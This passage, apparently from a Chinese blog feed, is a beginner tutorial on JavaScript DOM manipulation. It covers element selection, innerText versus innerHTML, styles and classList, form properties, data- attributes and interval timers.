class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>查找元素类型节点<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>从整个 DOM 树中查找 DOM 节点是学习 DOM 的第一个步骤。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>元素<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>元素<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>元素<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>元素<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> p = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;p&#x27;</span>)  <span class="comment">// 获取第一个p元素</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> lis = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;li&#x27;</span>)  <span class="comment">// 获取第一个p元素</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>总结：</p><ul><li><code>document.getElementById</code> 专门获取元素类型节点，根据标签的 <code>id</code> 属性查找</li><li>任意 DOM 对象都包含 <code>nodeType</code> 属性，用来检检测节点类型</li></ul><h1 id="操作元素内容"><a href="#操作元素内容" class="headerlink" title="操作元素内容"></a>操作元素内容</h1><p>通过修改 DOM 的文本内容，动态改变网页的内容。</p><ol><li><code>innerText</code> 将文本内容添加&#x2F;更新到任意标签位置，<strong>文本中包含的标签不会被解析。</strong></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// innerText 将文本内容添加/更新到任意标签位置</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> intro = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.intro&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">intro.<span class="property">innerText</span> = <span class="string">&#x27;嗨~ 我叫李雷！&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// intro.innerText = &#x27;&lt;h4&gt;嗨~ 我叫李雷！&lt;/h4&gt;&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li><code>innerHTML</code> 将文本内容添加&#x2F;更新到任意标签位置，<strong>文本中包含的标签会被解析。</strong></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// innerHTML 将文本内容添加/更新到任意标签位置</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> intro = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.intro&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">intro.<span class="property">innerHTML</span> = <span class="string">&#x27;嗨~ 我叫韩梅梅！&#x27;</span></span></span><br><span class="line"><span class="language-javascript">intro.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;h4&gt;嗨~ 我叫韩梅梅！&lt;/h4&gt;&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>总结：如果文本内容中包含 <code>html</code> 标签时推荐使用 <code>innerHTML</code>，否则建议使用 <code>innerText</code> 属性。</p><h1 id="操作元素属性"><a href="#操作元素属性" class="headerlink" title="操作元素属性"></a>操作元素属性</h1><h2 id="操作元素常用属性"><a href="#操作元素常用属性" class="headerlink" title="操作元素常用属性"></a>操作元素常用属性</h2><ol><li>直接能过属性名修改，最简洁的语法</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 1. 获取 img 对应的 DOM 元素</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> pic = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.pic&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 2. 修改属性</span></span></span><br><span class="line"><span class="language-javascript">  pic.<span class="property">src</span> = <span class="string">&#x27;./images/lion.webp&#x27;</span></span></span><br><span class="line"><span class="language-javascript">  pic.<span class="property">width</span> = <span class="number">400</span>;</span></span><br><span class="line"><span class="language-javascript">  pic.<span class="property">alt</span> = <span class="string">&#x27;图片不见了...&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="操作元素样式属性"><a href="#操作元素样式属性" class="headerlink" title="操作元素样式属性"></a>操作元素样式属性</h2><ol><li><strong>通过修改行内样式 <code>style</code> 属性，实现对样式的动态修改。</strong><ul><li><code>对象.style.样式属性 = 值</code></li></ul></li></ol><p>通过元素节点获得的 <code>style</code> 属性，本身的数据类型也是对象，如 <code>box.style.color</code>、<code>box.style.width</code> 分别用来获取元素节点 CSS 样式的 <code>color</code> 和 <code>width</code> 的值。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>练习 - 修改样式<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span>&gt;</span>随便一些文本内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 获取 DOM 节点</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> box = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.intro&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    box.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;red&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    box.<span class="property">style</span>.<span class="property">width</span> = <span class="string">&#x27;300px&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// css 属性的 - 连接符与 JavaScript 的 减运算符</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 冲突，所以要改成驼峰法</span></span></span><br><span class="line"><span class="language-javascript">    box.<span class="property">style</span>.<span class="property">backgroundColor</span> = <span class="string">&#x27;pink&#x27;</span></span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>任何标签都有 <code>style</code> 属性，通过 <code>style</code> 属性可以动态更改网页标签的样式，如要遇到 <code>css</code> 属性中包含字符 <code>-</code> 时，使用<strong>驼峰命名法</strong>，要将 <code>-</code> 去掉并将其后面的字母改成大写，如 <code>background-color</code> 要写成 <code>box.style.backgroundColor</code></li></ul><ol start="2"><li><strong>操作类名(className) 操作CSS</strong></li></ol><p>如果修改的样式比较多，直接通过style属性修改比较繁琐，我们可以通过借助于css类名的形式。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>练习 - 修改样式<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.pink</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background</span>: pink;</span></span><br><span class="line"><span class="language-css"><span class="attribute">color</span>: hotpink;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span>&gt;</span>随便一些文本内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 获取 DOM 节点</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> box = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.intro&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">box.<span class="property">className</span> = <span class="string">&#x27;pink&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意：</p><ol><li><p>由于class是关键字, 所以使用className去代替</p></li><li><p>className是使用新值换旧值, 如果需要添加一个类,需要保留之前的类名</p></li><li><p><strong>通过 classList 操作类控制CSS</strong></p></li></ol><p>为了解决<code>className</code> 容易覆盖以前的类名，我们可以通过<code>classList</code>方式<strong>追加</strong>、<strong>删除</strong>和<strong>切换</strong>类名</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: pink;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.active</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: hotpink;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-left</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;one&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 获取元素</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> box = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;div&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// add()是个方法 添加  追加</span></span></span><br><span class="line"><span class="language-javascript">        box.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;active&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// remove() 移除 类</span></span></span><br><span class="line"><span class="language-javascript">        box.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;one&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// toggle()切换类</span></span></span><br><span class="line"><span class="language-javascript">        box.<span class="property">classList</span>.<span class="title function_">toggle</span>(<span class="string">&#x27;one&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="操作表单元素属性"><a href="#操作表单元素属性" class="headerlink" title="操作表单元素属性"></a>操作表单元素属性</h2><p>表单很多情况，也需要修改属性，比如点击眼睛，可以看到密码，本质是把表单类型转换为文本框</p><p>正常的有属性有取值的跟其他的标签属性没有任何区别</p><p>获取：<code>DOM对象.属性名</code></p><p>设置：<code>DOM对象.属性名= 新值</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;请输入&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">disabled</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;agree&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 1. 获取元素</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> input = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;input&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 2. 取值或者设置值  得到input里面的值可以用 value</span></span></span><br><span class="line"><span class="language-javascript">        input.<span class="property">value</span> = <span class="string">&#x27;小米手机&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        input.<span class="property">type</span> = <span class="string">&#x27;password&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 2. 启用按钮</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// disabled 不可用   =  false  这样可以让按钮启用</span></span></span><br><span class="line"><span class="language-javascript">        btn.<span class="property">disabled</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 3. 勾选复选框</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> checkbox = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.agree&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        checkbox.<span class="property">checked</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="自定义属性"><a href="#自定义属性" class="headerlink" title="自定义属性"></a>自定义属性</h2><p><strong>标准属性</strong>: 标签天生自带的属性，比如<code>class</code>、<code>id</code>、<code>title</code>等, 可以直接使用点语法操作，比如： <code>disabled</code>、<code>checked</code>、<code>selected</code></p><p><strong>自定义属性</strong>：</p><ul><li>在html5中推出来了专门的data-自定义属性</li><li>在标签上一律以<code>data-</code>开头</li><li>在DOM对象上一律以<code>dataset</code>对象方式获取</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">data-id</span>=<span class="string">&quot;1&quot;</span> <span class="attr">data-name</span>=<span class="string">&quot;自定义&quot;</span>&gt;</span> 自定义属性 <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 1. 获取元素</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">let</span> div = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;div&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 2. 获取自定义属性值</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(div.<span class="property">dataset</span>.<span class="property">id</span>)  <span class="comment">// 1</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(div.<span class="property">dataset</span>.<span class="property">name</span>)  <span class="comment">// 自定义</span></span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="定时器-间歇函数"><a href="#定时器-间歇函数" class="headerlink" title="定时器-间歇函数"></a>定时器-间歇函数</h1><p>定时器函数可以开启和关闭定时器</p><ul><li><code>setInterval(函数, 间隔时间)</code><ul><li>作用：每隔一段时间调用一次这个函数</li><li>间隔时间单位是毫秒ms</li></ul></li></ul><ol><li>打开定时器</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 1. 定义一个普通函数</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">repeat</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;不知疲倦的执行下去....&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 2. 使用 setInterval 调用 repeat 函数，间隔 1000 毫秒，重复调用 repeat</span></span></span><br><span class="line"><span class="language-javascript">  <span class="built_in">setInterval</span>(repeat, <span class="number">1000</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>关闭定时器</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个函数，并执行，获取定时器id</span></span><br><span class="line"><span class="keyword">let</span> timer = <span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;执行下去！&#x27;</span>)</span><br><span class="line">&#125;, <span class="number">1000</span>)</span><br><span class="line"><span class="comment">// 使用定时器id关闭定时器</span></span><br><span class="line"><span class="built_in">clearInterval</span>(timer)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> WebAPIs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript-函数、对象</title>
      <link href="/2024/01/28/JavaScript-%E5%87%BD%E6%95%B0%E3%80%81%E5%AF%B9%E8%B1%A1/"/>
      <url>/2024/01/28/JavaScript-%E5%87%BD%E6%95%B0%E3%80%81%E5%AF%B9%E8%B1%A1/</url>
      
